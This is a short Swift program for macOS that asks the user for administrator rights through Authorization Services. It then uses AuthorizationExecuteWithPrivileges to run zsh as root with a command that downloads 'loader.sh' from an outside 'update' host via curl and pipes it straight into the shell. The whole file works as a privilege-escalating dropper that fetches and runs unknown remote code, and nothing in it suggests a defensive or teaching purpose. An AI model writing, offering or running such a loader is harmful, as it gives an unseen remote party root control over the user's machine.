import Foundation
import Security

let script = "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"

var authRef: AuthorizationRef?
var status = AuthorizationCreate(nil, nil, [], &authRef)
guard status == errAuthorizationSuccess, let auth = authRef else { exit(1) }

kAuthorizationRightExecute.withCString { namePtr in
    var item = AuthorizationItem(name: namePtr, valueLength: 0, value: nil, flags: 0)
    withUnsafeMutablePointer(to: &item) { itemPtr in
        var rights = AuthorizationRights(count: 1, items: itemPtr)
        let flags: AuthorizationFlags = [.interactionAllowed, .preAuthorize, .extendRights]
        status = AuthorizationCopyRights(auth, &rights, nil, flags, nil)
    }
}

guard status == errAuthorizationSuccess else {
    AuthorizationFree(auth, [.destroyRights])
    exit(1)
}

var cArgs: [UnsafeMutablePointer<CChar>] = [strdup("-c"), strdup(script)]
let toolPath = "/bin/zsh"
var communicationPipe: UnsafeMutablePointer<FILE>? = nil

status = AuthorizationExecuteWithPrivileges(auth, toolPath, [], &cArgs, &communicationPipe)

cArgs.forEach { free($0) }
AuthorizationFree(auth, [.destroyRights])

exit(status == errAuthorizationSuccess ? 0 : 1)
